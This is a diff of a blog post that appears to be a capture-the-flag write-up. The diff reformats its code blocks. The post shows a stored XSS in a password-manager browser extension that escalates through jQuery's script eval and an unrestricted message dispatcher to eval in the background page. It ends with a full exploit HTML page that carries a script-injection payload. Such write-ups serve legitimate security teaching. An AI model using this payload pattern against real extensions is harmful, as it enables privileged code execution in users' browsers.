@@ -19,8 +19,10 @@
 
 <p>This browser extension is a minimalist password manager: it doesn&#8217;t bother storing passwords, only login names. And the vulnerability is of a very common type: when generating <span class="caps">HTML</span> code, this extension forgets to escape <span class="caps">HTML</span> entities in the logins:</p>
 
-<pre><code>      for (let login of logins)
-        html += `&lt;li&gt;&lt;a href=&quot;#&quot; data-value=&quot;${login}&quot;&gt;${login}&lt;/a&gt;&lt;/li&gt;`;</code></pre>
+{{< highlight js >}}
+      for (let login of logins)
+        html += `<li><a href="#" data-value="${login}">${login}</a></li>`;
+{{< /highlight >}}
 
 <p>Since the website can fill out and submit a form programmatically, it can make this extension remember whichever login it wants. Making the extension store something like <code>login&lt;img src=x onerror=alert(1)&gt;</code> will result in JavaScript code executing whenever the user opens the website in future. Trouble is: the code executes in the context of the same website that injected this code in the first place, so nothing is gained by that.</p>
 
@@ -30,8 +32,10 @@
 
 <p>And now comes something very non-obvious. The <span class="caps">HTML</span> code is being inserted using the following:</p>
 
-<pre><code>$container = $(html);
-$login.parent().prepend($container);</code></pre>
+{{< highlight js >}}
+$container = $(html);
+$login.parent().prepend($container);
+{{< /highlight >}}
 
 <p>One would think that jQuery uses <code>innerHTML</code> or its moral equivalent here but that&#8217;s not actually true. <code>innerHTML</code> won&#8217;t execute JavaScript code within <code>&lt;script&gt;</code> tags, so jQuery is being “helpful” and executing that code separately. Newer jQuery versions will add a <code>&lt;script&gt;</code> tag to the <span class="caps">DOM</span> temporarily but the versions before jQuery 2.1.2 will essentially call <code>eval()</code>. Bingo!</p>
 
@@ -43,7 +47,9 @@ $login.parent().prepend($container);</code></pre>
 
 <p>But the way the background page translates message types into handlers is remarkable:</p>
 
-<pre><code>window[message.type].apply(window, message.params)</code></pre>
+{{< highlight js >}}
+window[message.type].apply(window, message.params)
+{{< /highlight >}}
 
 <p>If you look closely, you are not restricted by the handler functions defined in the background page, any global JavaScript function will do! And there is one particularly useful function called <code>eval()</code>. So your message has to look like this to extract the flag: <code>{type: &#39;eval&#39;, params: [&#39;console.log(FLAG)&#39;]}</code>. There you go, you have code running in the background page that can extract the flag or do just about anything.</p>
 
@@ -51,31 +57,33 @@ $login.parent().prepend($container);</code></pre>
 
 <p>So here is my complete solution. As usually, this is only one way of doing it.</p>
 
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-  &lt;head&gt;
-    &lt;meta charset=&quot;utf-8&quot;&gt;
-    &lt;title&gt;Safe Login Storage solution&lt;/title&gt;
-    &lt;script&gt;
-      window.addEventListener(&quot;load&quot;, event =&gt;
+{{< highlight html >}}
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Safe Login Storage solution</title>
+    <script>
+      window.addEventListener("load", event =>
       {
-        window.setTimeout(() =&gt;
+        window.setTimeout(() =>
         {
-          let container = document.getElementById(&quot;logins-container&quot;);
-          if (!container || !container.querySelector(&quot;[data-value^=&#39;boom&#39;]&quot;))
+          let container = document.getElementById("logins-container");
+          if (!container || !container.querySelector("[data-value^='boom']"))
           {
-            document.getElementById(&quot;username&quot;).value = &quot;boom&lt;script&gt;chrome.runtime.sendMessage({type: &#39;eval&#39;, params: [&#39;console.log(FLAG)&#39;]})&lt;\/script&gt;&quot;;
-            document.getElementById(&quot;submit&quot;).click();
+            document.getElementById("username").value = "boom<script>chrome.runtime.sendMessage({type: 'eval', params: ['console.log(FLAG)']})<\/script>";
+            document.getElementById("submit").click();
             window.location.reload();
           }
         }, 2000);
       });
-    &lt;/script&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;form action=&quot;javascript:void(0)&quot; hidden&gt;
-      &lt;input id=&quot;username&quot;&gt;
-      &lt;input id=&quot;submit&quot; type=&quot;submit&quot;&gt;
-    &lt;/form&gt;
-  &lt;/body&gt;
-&lt;/html&gt;</code></pre>
+    </script>
+  </head>
+  <body>
+    <form action="javascript:void(0)" hidden>
+      <input id="username">
+      <input id="submit" type="submit">
+    </form>
+  </body>
+</html>
+{{< /highlight  >}}
